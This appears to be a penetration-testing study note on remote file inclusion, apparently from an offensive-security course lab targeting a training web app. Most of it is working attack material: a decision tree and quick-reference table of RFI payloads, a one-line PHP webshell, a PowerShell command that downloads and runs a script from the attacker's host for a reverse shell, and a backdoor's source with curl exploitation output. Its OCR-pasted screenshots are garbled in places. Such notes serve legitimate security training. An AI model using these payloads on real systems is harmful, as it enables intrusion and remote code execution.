---
tags:
  - phase/exploitation
  - rce
  - rfi
  - web
---

# Remote file inclusion (RFI)

> [!tip] Quick Reference — RFI
> | Step | Command |
> |------|---------|
> | Host malicious file | `python3 -m http.server 80` |
> | Basic RFI test | `?page=http://<LHOST>/test.txt` |
> | RFI shell | `?page=http://<LHOST>/shell.php` |
> | SMB RFI (Windows) | `?page=\\<LHOST>\share\shell.php` |

## Decision Tree

```
LFI confirmed — does it also load remote URLs?
├── Test: ?page=http://<your-IP>/test.txt
│   ├── Get request hits your server → RFI confirmed!
│   └── No hit → RFI not available (allow_url_include=Off)
│
├── RFI confirmed?
│   ├── Create PHP shell on Kali
│   │   └── echo '<?php system($_GET["cmd"]); ?>' > shell.php
│   ├── Start web server
│   │   └── python3 -m http.server 80
│   └── Trigger: ?page=http://<LHOST>/shell.php&cmd=id
│
├── Windows target?
│   └── Try SMB: ?page=\\<LHOST>\share\shell.php
│       └── sudo impacket-smbserver share . -smb2support
│
└── Got RCE → upgrade to reverse shell
    └── ?page=http://<LHOST>/shell.php&cmd=powershell+-c+"iex(iwr http://<LHOST>/shell.ps1)"
```

## Resources
- [HackTricks — RFI](https://book.hacktricks.xyz/pentesting-web/file-inclusion#rfi)
- [PayloadsAllTheThings — RFI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#remote-file-inclusion)


Remote file inclusion (RFI) vulnerabilities are less common than LFIs since the target system must be configured in a specific way. In PHP web applications, for example, the allow_url_include option needs to be enabled to leverage RFI, just as with the data:// wrapper from the previous section.

Kali Linux includes several PHP webshells in the /usr/share/webshells/php/ directory that can be used for RFI. A webshell is a small script that provides a web-based command line interface, making it easier and more convenient to execute commands. In this example, we will use the simple-backdoor.php webshell to exploit an RFI vulnerability in the "Mountain Desserts" web application.

> [!note]- Screenshot
> ```
> First, let's briefly review the contents of the simple-
> backdoor.php webshell. We'll use it to test the LFI vulnerability
> from the previous sections for RFI. The code is very similar to the
> PHP snippet we used in previous sections. It accepts commands
> in the cmd parameter and executes them via the system function.
> kaligkali: /usr/share/webshells/php/$ cat simple-backdoor..php
> <2php
> f(isset($_REQUEST[ ‘cmd"])){
> echo "<pre>";
> $cmd = ($_REQUEST[ "cmd" ])5
> system($cmd) 5
> echo "</pre>";
> die;
> +
> 2»
> Usage: http: //target.com/simple-backdoor . php?cmd=cat+/etc/passw
> a
> Listing 27 - Location and contents of the simple-backdoor.php webshell
> To leverage an RFI vulnerability, we need to make the remote file
> accessible by the target system. We can use the Python3
> /http.server module to start a web server on our Kali machine and
> serve the file we want to include remotely on the target system.
> The http.server module sets the web root to the current directory
> of our terminal.
> We could also use a publicly-accessible file, such as
> one from Github.
> ```


> [!note]- Screenshot
> ```
> kali@kali:/usr/share/webshells/php/$ python3 -m http.server 80
> Serving HTTP on @.0.0.@ port 8@ (http://0.0.0.0:80/) ...
> Listing 28 - Starting the Python3 http.server module
> 
> After the web server is running with /usr/share/webshells/php/
> as its current directory, we have completed all necessary steps
> on our attacking machine. Next, we'll use curl to include the
> hosted file via HTTP and specify Is as our command.
> 
> kaligkali:/usr/share/webshells/php/$ curl “http://mountaindesse
> 
> rts .com/meteor/index. php?page-http: //192.168.119.3/simple-backd
> 
> oor. php&cmd=15"
> 
> <a href="index.php?page=admin.php"><p style="text-align:cente
> 
> Pp" >Admin</p></a>
> 
> <!-- Simple PHP backdoor by DK (http: //michaeldaw.org) -->
> 
> <pre>admin.php
> 
> bavarian.php
> 
> css
> 
> fonts
> 
> img
> 
> index.php
> 
> is
> 
> </pre>
> 
> Listing 29 - Exploiting RFI with a PHP backdoor and execution of Is
> 
> Listing 29 shows that we successfully exploited an RFI
> vulnerability by including a remotely hosted webshell. We could
> now use Netcat again to create a reverse shell and receive an
> interactive shell on the target system, as in the LFI section.
> ```

python3 -m http.server 80

curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls"

└─$ curl "http://192.168.158.16/meteor/index.php?page=http://192.168.45.220/simple-backdoor.php&cmd=ls"